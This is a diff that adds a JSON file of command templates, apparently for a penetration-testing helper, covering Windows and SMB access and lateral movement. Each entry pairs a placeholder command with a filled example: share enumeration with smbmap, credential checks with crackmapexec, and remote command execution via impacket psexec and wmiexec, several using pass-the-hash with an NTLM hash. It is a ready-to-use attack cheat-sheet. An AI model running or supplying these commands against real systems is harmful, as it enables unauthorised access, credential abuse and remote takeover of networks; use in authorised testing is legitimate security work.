@@ -1,0 +1,41 @@
+
+  [
+
+        {
+          "command":"smbmap -u ##USER## -p ##PASSWORD## -d ##DOMAIN## -H ##HOST##",
+          "display":"SMB Map",
+          "example":"smbmap -u terry -p password123 -d light.local -H 192.168.0.1"
+        },
+        {
+          "command":"crackmapexec smb ##HOST## -u ##USER## -p '##PASSWORD##' -d ##DOMAIN##  ",
+          "display":"CrackMapExec",
+          "example":"crackmapexec smb 192.168.0.1 -u terry -p 'password123' -d light.local"
+        },
+
+        {
+          "command":"crackmapexec smb ##HOST## -u ##USER## -H ##HASH## -d ##DOMAIN##  ",
+          "display":"CrackMapExec[H]",
+          "example":"crackmapexec smb 192.168.0.1 -u terry -H A9FDFA038C4B75EBC76DC855DD74F0DA -d light.local"
+        },
+
+        {
+          "command":"impacket-psexec ##DOMAIN##/##USER##:'##PASSWORD##'@##HOST##",
+          "display":"Impacket psexec",
+          "example":"impacket-psexec light.local/terry:'password123'@192.168.0.1"
+        },
+        {
+          "command":"impacket-psexec ##DOMAIN##/##USER##:@##HOST## -hashes :##HASHES##",
+          "display":"Impacket psexec[H]",
+          "example":"impacket-psexec light.local/terry@192.168.0.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA"
+        },
+        {
+          "command":"impacket-wmiexec ##DOMAIN##/##USER##:'##PASSWORD##'@##HOST##",
+          "display":"Impacket wmiexec",
+          "example":"impacket-wmiexec light.local/terry:'password123'@192.168.0.1"
+        },
+    {
+      "command": "impacket-wmiexec ##DOMAIN##/##USER##:@##HOST## -hashes :##HASHES##",
+      "display": "Impacket wmiexec[H]",
+      "example": "impacket-wmiexec light.local/terry@192.168.0.1 -hashes :A9FDFA038C4B75EBC76DC855DD74F0DA"
+    }
+    ]
